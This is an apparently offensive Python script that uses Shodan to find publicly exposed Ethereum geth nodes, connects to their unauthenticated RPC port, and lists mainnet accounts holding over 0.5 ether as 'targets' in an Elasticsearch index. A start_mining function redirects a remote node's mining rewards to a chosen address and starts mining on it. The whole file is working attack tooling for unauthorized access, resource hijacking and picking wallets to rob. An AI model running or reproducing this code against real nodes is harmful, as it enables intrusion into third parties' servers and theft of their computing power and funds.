import shodan
import web3
from web3 import Web3, HTTPProvider, TestRPCProvider
from web3.contract import ConciseContract
from pwngeth.es import ElasticsearchConsumer

CLOUD_PROVIDERS = [
    'Microsoft Corporation',
    'Choopa',
    'Google Cloud',
    'Amazon.com',
    'Enzu',
    'SuperNetwork s.r.o',
    'Digital Ocean',
    ## ETC ETC ETC

]

def start_mining(ip, capture_ip):
    web3 = Web3(HTTPProvider('http://{}:8545'.format(ip)))
    web3.miner.setEtherBase(capture_ip)
    web3.miner.start(4)
    return web3.eth.mining


def search_shodan(api_key):
    api = shodan.Shodan(api_key)
    results = api.search('geth')
    return results['matches']


def get_account_balances(ip_str, web3):
    acc_dict = {}
    for x in web3.personal.listAccounts:
        wei = web3.eth.getBalance(x)
        balance = web3.fromWei(wei, 'ether')
        if balance > 0.5:
            acc_dict[x] = {
                'ether': str(int(balance)),
                'wei': str(wei)
            }
    return acc_dict

def escalate_admin_get_balances(ip_str):
    try:
        web3 = Web3(HTTPProvider('http://' + ip_str + ':8545'))
        try:
            web3.admin.datadir
            v = web3.version.network

            if v == 1:
                return get_account_balances(ip_str, web3)
            else:
                return False
        except ValueError as e:
            return False
    except Exception as e:
        print(e)
        return False

def index_shodan(shodan_result):
    consumer = ElasticsearchConsumer(cluster='localhost', index='hackgeth_shodan_main')
    consumer.put_in_index(shodan_result)

def index_targets(shodan_result, addrs):

    consumer = ElasticsearchConsumer(cluster='localhost', index='hackgeth_main')
    for k,v in addrs.items():
        doc = {
            'addr': k,
            'ether': v.get('ether'),
            'wei': v.get('wei'),
            'ip': shodan_result['ip_str'],
            'isp': shodan_result['isp'],
            'org': shodan_result['org']
        }
        if not consumer.put_in_index(doc):
            break

def gen_targets_main(shodan_key):
    results = search_shodan(shodan_key)
    count = 0
    for res in results:
        index_shodan(res)
        ip = res['ip_str']
        money = escalate_admin_get_balances(ip)
        if money:

            index_targets(res, money)
            count += 1
    print("{} Targets Added!".format(str(count)))
